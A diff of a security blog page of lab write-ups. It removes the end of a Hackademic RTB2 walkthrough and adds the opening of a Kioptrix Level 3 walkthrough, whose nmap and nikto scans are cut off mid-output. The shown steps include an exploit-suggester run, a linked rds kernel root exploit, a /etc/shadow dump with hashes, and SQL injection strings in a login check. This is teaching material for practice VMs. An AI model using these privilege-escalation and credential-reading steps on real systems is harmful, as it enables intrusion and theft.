-</span><span class='line'><span class="k">var</span> <span class="nv">$sef_suffix</span>    <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cm">/* Feed Settings */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$feed_limit</span>   <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$feed_email</span>   <span class="o">=</span> <span class="s1">&#39;author&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$log_path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/logs&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$tmp_path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/tmp&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cm">/* Session Setting */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$lifetime</span> <span class="o">=</span> <span class="s1">&#39;15&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$session_handler</span> <span class="o">=</span> <span class="s1">&#39;database&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We download the <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">Linux_Exploit_Suggester.pl</a> and use for finding an exploit for privilege escalation:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@HackademicRTB2:/tmp$ perl Linux_Exploit_Suggester.pl
-</span><span class='line'>perl Linux_Exploit_Suggester.pl
-</span><span class='line'>
-</span><span class='line'>Kernel local: 2.6.32
-</span><span class='line'>
-</span><span class='line'>Searching among 65 exploits...
-</span><span class='line'>
-</span><span class='line'>Possible Exploits:
-</span><span class='line'>[+] american-sign-language
-</span><span class='line'>   CVE-2010-4347
-</span><span class='line'>   Source: http://www.securityfocus.com/bid/45408/
-</span><span class='line'>[+] can_bcm
-</span><span class='line'>   CVE-2010-2959
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/14814/
-</span><span class='line'>[+] half_nelson
-</span><span class='line'>   Alt: econet    CVE-2010-3848
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/6851
-</span><span class='line'>[+] half_nelson1
-</span><span class='line'>   Alt: econet    CVE-2010-3848
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/17787/
-</span><span class='line'>[+] half_nelson2
-</span><span class='line'>   Alt: econet    CVE-2010-3850
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/17787/
-</span><span class='line'>[+] half_nelson3
-</span><span class='line'>   Alt: econet    CVE-2010-4073
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/17787/
-</span><span class='line'>[+] msr
-</span><span class='line'>   CVE-2013-0268
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/27297/
-</span><span class='line'>[+] pktcdvd
-</span><span class='line'>   CVE-2010-3437
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15150/
-</span><span class='line'>[+] ptrace_kmod2
-</span><span class='line'>   Alt: ia32syscall,robert_you_suck    CVE-2010-3301
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15023/
-</span><span class='line'>[+] rawmodePTY
-</span><span class='line'>   CVE-2014-0196
-</span><span class='line'>   Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
-</span><span class='line'>[+] rds
-</span><span class='line'>   CVE-2010-3904
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15285/
-</span><span class='line'>[+] reiserfs
-</span><span class='line'>   CVE-2010-1146
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/12130/
-</span><span class='line'>[+] video4linux
-</span><span class='line'>   CVE-2010-3081
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15024/</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We root the server using:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15285.c
-</span><span class='line'>
-</span><span class='line'>[+] rds
-</span><span class='line'>   CVE-2010-3904
-</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15285/</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># cat /etc/shadow
-</span><span class='line'>cat /etc/shadow
-</span><span class='line'>root:$6$YB3puY.G$drg9.SqpJyPujoS82zbwdQtM7xgPpAJlDmdQaH8tu2ndUrmNwIx29lYazyhhsFKKF.yw6ScopFmMAh.t/qIZn0:14999:0:99999:7:::
-</span><span class='line'>daemon:*:14837:0:99999:7:::
-</span><span class='line'>bin:*:14837:0:99999:7:::
-</span><span class='line'>sys:*:14837:0:99999:7:::
-</span><span class='line'>sync:*:14837:0:99999:7:::
-</span><span class='line'>games:*:14837:0:99999:7:::
-</span><span class='line'>man:*:14837:0:99999:7:::
-</span><span class='line'>lp:*:14837:0:99999:7:::
-</span><span class='line'>mail:*:14837:0:99999:7:::
-</span><span class='line'>news:*:14837:0:99999:7:::
-</span><span class='line'>uucp:*:14837:0:99999:7:::
-</span><span class='line'>proxy:*:14837:0:99999:7:::
-</span><span class='line'>www-data:*:14837:0:99999:7:::
-</span><span class='line'>backup:*:14837:0:99999:7:::
-</span><span class='line'>list:*:14837:0:99999:7:::
-</span><span class='line'>irc:*:14837:0:99999:7:::
-</span><span class='line'>gnats:*:14837:0:99999:7:::
-</span><span class='line'>nobody:*:14837:0:99999:7:::
-</span><span class='line'>libuuid:!:14837:0:99999:7:::
-</span><span class='line'>syslog:*:14837:0:99999:7:::
-</span><span class='line'>messagebus:*:14837:0:99999:7:::
-</span><span class='line'>avahi-autoipd:*:14837:0:99999:7:::
-</span><span class='line'>avahi:*:14837:0:99999:7:::
-</span><span class='line'>couchdb:*:14837:0:99999:7:::
-</span><span class='line'>speech-dispatcher:!:14837:0:99999:7:::
-</span><span class='line'>usbmux:*:14837:0:99999:7:::
-</span><span class='line'>haldaemon:*:14837:0:99999:7:::
-</span><span class='line'>kernoops:*:14837:0:99999:7:::
-</span><span class='line'>pulse:*:14837:0:99999:7:::
-</span><span class='line'>rtkit:*:14837:0:99999:7:::
-</span><span class='line'>saned:*:14837:0:99999:7:::
-</span><span class='line'>hplip:*:14837:0:99999:7:::
-</span><span class='line'>gdm:*:14837:0:99999:7:::
-</span><span class='line'>p0wnbox:$6$AT8lMX0W$GPAZaGLMX0mi5EPFhx9wT5qJu9bxkIEfH.cmKX/j/O3QpRWXgBQ2WUAa.SIoFGdcfKrv.FtuBVn1UonfItMrw1:14999:0:99999:7:::
-</span><span class='line'>mysql:!:14991:0:99999:7:::
-</span><span class='line'>
-</span><span class='line'># pwd
-</span><span class='line'>pwd
-</span><span class='line'>/root
-</span><span class='line'># ls -l 
-</span><span class='line'>ls -l 
-</span><span class='line'>total 40
-</span><span class='line'>drwxr-xr-x 2 root root  4096 Jan 17  2011 Desktop
-</span><span class='line'>-rwxr-xr-x 1 root root 33921 Jan 22  2011 Key.txt
-</span><span class='line'>
-</span><span class='line'># cat /etc/knockd.conf
-</span><span class='line'>cat /etc/knockd.conf
-</span><span class='line'>[options]
-</span><span class='line'>        UseSyslog
-</span><span class='line'>
-</span><span class='line'>[openHTTPD]
-</span><span class='line'>        sequence    = 7000,8000,9000
-</span><span class='line'>        seq_timeout = 5
-</span><span class='line'>        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
-</span><span class='line'>        tcpflags    = syn
-</span><span class='line'>
-</span><span class='line'>[closeHTTPD]
-</span><span class='line'>        sequence    = 9000,8000,7000
-</span><span class='line'>        seq_timeout = 5
-</span><span class='line'>        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
-</span><span class='line'>        tcpflags    = syn
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'># base64 -d /root/Key.txt > /var/www/key.png
-</span><span class='line'>base64 -d /root/Key.txt > /var/www/key.png</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We can check the flag <a href="http://192.168.80.150:666/key.png">here</a>. As we can see
-from output above, there is port-knocking mechanism using sequences 7000,8000,9000.</p>
-
-<p>Finally we want to see the check.php source:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1"># cat /var/www/welcome/check.php</span>
-</span><span class='line'><span class="nx">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">welcome</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=UTF-8&quot;</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Hackademic</span><span class="o">.</span><span class="nx">RTB2</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">body</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;black&quot;</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;hackademicrtb2.png&quot;</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="s2">&quot;green&quot;</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'><span class="nv">$pass_answer</span> <span class="o">=</span> <span class="s2">&quot;&#39; or 1=1--&#39;&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$pass_answer_2</span> <span class="o">=</span> <span class="s2">&quot;&#39; OR 1=1--&#39;&quot;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$pass_answer</span> <span class="k">or</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$pass_answer_2</span><span class="p">){</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;h2&gt;&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;Ok, nice shot...&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;/h2&gt;&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;...but, you are looking in a wrong place bro! ;-)&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;font color=&quot;black&quot;&gt;&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;/font color=&quot;black&quot;&gt;&#39;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">else</span><span class="p">{</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;h2&gt;&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;You are trying to login with wrong credentials!&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;/h2&gt;&#39;</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Please try again...&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After decoding the hex characters and converting binary digits in ruby:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>irb(main):017:0>  [0b00110001, 0b00110000, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110001, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110001, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110000, 0b00110001].map{|x|x.chr}.join
-</span><span class='line'>=> "1001:1101:1011:1001"</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So the SQLi test is validated using string compare operator and it&rsquo;s quite
-non-realistic (and unfair) to have two statements with the different case, that
-was the reason why we didn&rsquo;t found out this firstly.</p>
-</div>
-  
-  
-
-
-    </article>
   
   
     <article>
@@ -1887,6 +1074,548 @@ able to locate the password file, without cracking it:</p>
 </span><span class='line'>sshd:*:15101:0:99999:7:::
 </span><span class='line'>landscape:*:15101:0:99999:7:::
 </span><span class='line'>dan:$6$Iu1ipXkP$F9Jdj7JNf56/UjrXgOTks3mqYO6J/ErWUtf.EWr2AT8lv6aHy3K6Ywjmd7HCUswgiEYDHMwq/aqwJToXl0ERs1:15101:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/17/kioptrix-level-3/">Kioptrix: Level 3</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-17T08:14:45+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:14 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix: Level 1.2 (#3)</a></p>
+
+<p>DHCP client is running on the image and we got assigned this IP address:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ tail -n 5 /var/db/vmware/vmnet-dhcpd-vmnet8.leases
+</span><span class='line'>lease 192.168.80.145 {
+</span><span class='line'>  starts 0 2015/05/17 06:14:07;
+</span><span class='line'>  ends 0 2015/05/17 06:44:07;
+</span><span class='line'>  hardware ethernet 00:0c:29:d6:3b:13;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We add to &lsquo;/etc/hosts&rsquo;:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.80.145 kioptrix3.com</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap kioptrix3.com -p- -sV
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-25 20:23 CEST
+</span><span class='line'>Nmap scan report for kioptrix3.com (192.168.80.145)
+</span><span class='line'>Host is up (0.00025s latency).
+</span><span class='line'>Not shown: 65533 closed ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+</span><span class='line'>MAC Address: 00:0C:29:D6:3B:13 (VMware)
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nikto output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# nikto -h kioptrix3.com
+</span><span class='line'>- Nikto v2.1.6
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Target IP:          192.168.80.145
+</span><span class='line'>+ Target Hostname:    kioptrix3.com
+</span><span class='line'>+ Target Port:        80
+</span><span class='line'>+ Start Time:         2015-04-25 20:44:13 (GMT2)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+</span><span class='line'>+ Cookie PHPSESSID created without the httponly flag
+</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
+</span><span class='line'>+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 21:22:00 2009
+</span><span class='line'>+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.4.26)
+</span><span class='line'>+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+</span><span class='line'>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
